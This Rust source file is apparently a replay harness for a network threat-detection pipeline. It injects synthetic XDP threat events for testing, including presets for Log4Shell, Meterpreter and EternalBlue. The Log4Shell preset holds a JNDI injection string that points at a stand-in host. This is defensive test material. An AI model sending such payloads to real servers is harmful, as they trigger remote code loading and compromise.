//! Pcap-replay harness — exercises the full pipeline without CAP_BPF.
//!
//! Feeds synthetic XDP events into an `XdpBurpTap`'s queue as if the kernel
//! produced them. Useful for CI, unit tests, and running on sandboxes that
//! can't load eBPF.

use crate::tap::XdpBurpTap;
use kspike_kernel::xdp_event::{
    XdpSignalEvent, IP_BYTES, KIND_BYTES, ACTOR_BYTES, af, threat, fnv1a64,
};
use std::net::{Ipv4Addr, Ipv6Addr};

pub struct PcapReplay;

impl PcapReplay {
    /// Inject a synthetic IPv4 threat into the tap.
    pub fn inject_v4(tap: &XdpBurpTap,
                     kind: &str,
                     src: Ipv4Addr, dst: Ipv4Addr,
                     src_port: u16, dst_port: u16,
                     threat_lvl: u8, confidence: f32,
                     payload: &[u8])
    {
        let mut kind_buf = [0u8; KIND_BYTES];
        let kb = kind.as_bytes();
        kind_buf[..kb.len().min(KIND_BYTES)].copy_from_slice(&kb[..kb.len().min(KIND_BYTES)]);
        let mut src_ip = [0u8; IP_BYTES]; src_ip[..4].copy_from_slice(&src.octets());
        let mut dst_ip = [0u8; IP_BYTES]; dst_ip[..4].copy_from_slice(&dst.octets());
        let ev = XdpSignalEvent {
            af: af::IPV4, threat: threat_lvl, _pad0: [0;2],
            src_ip, dst_ip, src_port, dst_port,
            confidence_milli: (confidence.clamp(0.0,1.0) * 1000.0) as u16,
            proportionality: 0, _pad1: 0,
            kind: kind_buf, actor: [0; ACTOR_BYTES],
            payload_hash: fnv1a64(payload),
            ts_ns: now_ns(),
        };
        tap.sink().lock().unwrap().push_back(ev);
    }

    pub fn inject_v6(tap: &XdpBurpTap,
                     kind: &str,
                     src: Ipv6Addr, dst: Ipv6Addr,
                     src_port: u16, dst_port: u16,
                     threat_lvl: u8, confidence: f32,
                     payload: &[u8])
    {
        let mut kind_buf = [0u8; KIND_BYTES];
        let kb = kind.as_bytes();
        kind_buf[..kb.len().min(KIND_BYTES)].copy_from_slice(&kb[..kb.len().min(KIND_BYTES)]);
        let ev = XdpSignalEvent {
            af: af::IPV6, threat: threat_lvl, _pad0: [0;2],
            src_ip: src.octets(), dst_ip: dst.octets(),
            src_port, dst_port,
            confidence_milli: (confidence.clamp(0.0,1.0) * 1000.0) as u16,
            proportionality: 0, _pad1: 0,
            kind: kind_buf, actor: [0; ACTOR_BYTES],
            payload_hash: fnv1a64(payload),
            ts_ns: now_ns(),
        };
        tap.sink().lock().unwrap().push_back(ev);
    }

    /// Convenience presets for common simulated attacks.
    pub fn log4shell(tap: &XdpBurpTap, src: Ipv4Addr, dst: Ipv4Addr) {
        let payload = b"User-Agent: ${jndi:ldap://evil.example/a}";
        Self::inject_v4(tap, "log4shell.jndi", src, dst, 44321, 443,
                        threat::HOSTILE, 0.92, payload);
    }

    pub fn meterpreter(tap: &XdpBurpTap, src: Ipv4Addr, dst: Ipv4Addr) {
        let payload = b"meterpreter_stageless_beacon";
        Self::inject_v4(tap, "meterpreter.beacon", src, dst, 58192, 4444,
                        threat::HOSTILE, 0.85, payload);
    }

    pub fn eternalblue(tap: &XdpBurpTap, src: Ipv4Addr, dst: Ipv4Addr) {
        let payload = b"\xffSMB\xa0";
        Self::inject_v4(tap, "smb.ms17_010.probe", src, dst, 49231, 445,
                        threat::HOSTILE, 0.90, payload);
    }
}

fn now_ns() -> u64 {
    use std::time::{SystemTime, UNIX_EPOCH};
    SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_nanos() as u64).unwrap_or(0)
}
